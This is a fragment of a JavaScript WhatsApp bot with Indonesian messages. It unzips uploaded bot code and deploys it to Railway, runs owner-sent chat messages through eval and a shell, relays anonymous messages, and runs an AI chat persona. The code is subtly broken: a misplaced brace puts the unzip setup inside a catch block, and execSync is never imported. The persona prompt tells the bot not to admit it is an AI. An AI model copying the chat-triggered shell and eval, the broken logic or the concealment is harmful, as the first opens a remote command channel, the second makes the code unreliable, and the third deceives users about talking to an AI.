    return reply('⚠️ Reply pesan yang berisi file .zip berisi kode bot.')
  }
const { downloadContentFromMessage } = require('baileys')
const unzipper = require('unzipper')
const fs = require('fs')
const path = require('path')
const { exec } = require('child_process')

  // 1) Ambil token Railway dari global
  const railwayToken = global.tokenRailway
  if (!railwayToken) {
    return reply('⚠️ Global variabel `tokenRailway` belum diset.')
  }

  // 2) Download ZIP
  await reply('⬇️ Mengunduh file ZIP…')
  let buffer = Buffer.from([])
  try {
    const mediaType = qmsg.mtype.replace('Message', '')
    const stream = await downloadContentFromMessage(qmsg, mediaType)
    for await (const chunk of stream) buffer = Buffer.concat([buffer, chunk])
  } catch {
    return reply('❌ Gagal mengunduh file ZIP.')

  // 3) Unzip ke folder sementara
  const tempDir = path.join(__dirname, 'runbot_temp')
  if (fs.existsSync(tempDir)) fs.rmSync(tempDir, { recursive: true })
  fs.mkdirSync(tempDir)  }

  await reply('🗜  Mengekstrak ZIP…')
  try {
    const directory = await unzipper.Open.buffer(buffer)
    for (const file of directory.files) {
      if (file.type === 'File') {
        const filePath = path.join(tempDir, file.path)
        fs.mkdirSync(path.dirname(filePath), { recursive: true })
        fs.writeFileSync(filePath, await file.buffer())
      }
    }
  } catch {
    return reply('❌ Gagal mengekstrak ZIP. Pastikan file valid.')
  }

  // 4) Cek keberadaan Railway CLI global
  try {
    execSync('which railway')
  } catch {
    return reply(
      '❌ Railway CLI tidak ditemukan. Silakan install secara global:\n\n' +
      'npm install -g railway\n\n' +
      'Lalu restart bot dan coba lagi.'
    )
  }

  // 5) Deploy dengan Railway CLI
  await reply('🚀 Deploying to Railway… (ini bisa memakan waktu beberapa menit)')
  exec(
    `cd ${tempDir} && railway init --yes && railway up --detach --token ${railwayToken}`,
    (error, stdout, stderr) => {
      if (error) {
        console.error('Deploy error:', stderr || error.message)
        return reply(`❌ Deploy gagal:\n\`\`\`\n${stderr || error.message}\n\`\`\``)
      }
      const urlMatch = stdout.match(/https?:\/\/[^\s]+\.railway\.app/)
      const deployUrl = urlMatch
        ? urlMatch[0]
        : 'URL tidak terdeteksi, cek logs Railway CLI.'
      reply(`✅ Deploy berhasil!\n\n▶️ Akses: ${deployUrl}`)
    }
  )

  break
}

break
default:
}
if (budy.startsWith('=>')) {
if (!isOwner) return
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)}
return reply(bang)}
try {
reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
reply(String(e))
}}
if (budy.startsWith('$')) {
if (!isOwner) return
exec(budy.slice(2), (err, stdout) => {
if(err) return reply(err)
if (stdout) return reply(stdout)
})
}
if (budy.startsWith(">")) {
if (!isOwner) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await reply(evaled)
} catch (err) {
reply(String(err))
}
}
    let Senderman = m.sender;
    let targetNumber = confessDB[Senderman];

    if (targetNumber && m.quoted) {
        let replyText = m.text;
        await Izz.sendMessage(targetNumber, { text: `💬 *Pesan Rahasia!* 💬\n\n"${replyText}"\n\n_Balas pesan ini untuk membalas pengirim secara anonim._` }, { quoted: m });

        m.reply("✅ Pesan berhasil dikirim secara anonim.");
    }
    if (!m.isGroup && autoAiDB.status) {
        let sessionId = m.sender;
        
        // Cegah bot membalas pesan AI sendiri (mencegah spam loop)
        if (m.sender === botNumber) return;

        let prompt = "Kamu adalah AI yang siap membantu pengguna dalam berbagai topik.";
        let aiReply = await GPT(m.text, sessionId, prompt);

        await Izz.sendMessage(m.chat, { text: aiReply }, { quoted: m });
    }
if (sessions[sender]) {
if (m.isBaileys && m.fromMe) return;
if (!m.text) return;

if (
m.text.startsWith(".") ||
m.text.startsWith("#") ||
m.text.startsWith("!") ||
m.text.startsWith("/") ||
m.text.startsWith("\\/")
) return;

if (!sessions[sender].messages) sessions[sender].messages = [];
sessions[sender].messages.push({ user: m.text });
saveSession();
let chatHistory = sessions[sender].messages.map(msg => `User: ${msg.user}`).join("\n");
let prompt = `
Nama kamu adalah Rover, AI yang santai, ramah, dan suka ngobrol dengan pengguna. 
Kamu hanya menjawab kalau pesan bukan perintah. Gunakan gaya bahasa santai dan sedikit humoris.
Kalau ada yang suruh kamu ngomong aneh-aneh, tolak dengan gaya lucu.

📌 **Aturan Main Rover:**
- Jangan bilang kamu AI, cukup anggap kamu asisten virtual yang bisa ngobrol.
- Gunakan bahasa yang santai, tapi tetap sopan.
- Kalau ditanya pendapat, kasih jawaban yang relate dan enak diajak ngobrol.
- Selingi dengan ekspresi kayak "Wih, keren!", "Hmmm, menarik juga!", atau "Gokil sih!".

Berikut riwayat percakapan:
${chatHistory}

Sekarang, jawab pertanyaan user dengan gaya yang santai dan menyenangkan!
`;
// Edit Logika AI mu Namun jangan hapus ${chatHistory} //
try {
let requestData = { content: m.text, user: sender, prompt };
let response = (await axios.post('https://luminai.my.id', requestData)).data.result;

sessions[sender].messages.push({ bot: response });
saveSession();
return Izz.sendMessage(m.chat, { text: response }, { quoted: m });
} catch (err) {
console.error(err);
return m.reply("⚠️ *Terjadi kesalahan, coba lagi nanti!*");
 }
}
} catch (e) {
console.log(e)
}
}

let file = require.resolve(__filename) 
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})
